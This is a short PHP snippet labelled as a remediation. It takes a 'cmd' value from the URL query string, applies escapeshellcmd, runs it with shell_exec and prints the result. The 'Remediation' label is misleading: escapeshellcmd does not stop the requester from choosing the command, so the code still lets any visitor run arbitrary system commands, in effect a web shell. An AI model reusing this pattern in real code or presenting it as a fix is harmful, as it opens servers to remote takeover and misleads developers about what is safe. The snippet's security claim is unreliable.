<?php 
// Remediation
$cmd = $_GET['cmd'];
$cmd = escapeshellcmd($cmd);
$cmd_result = shell_exec($cmd);
echo "Command result: $cmd_result";

?> 
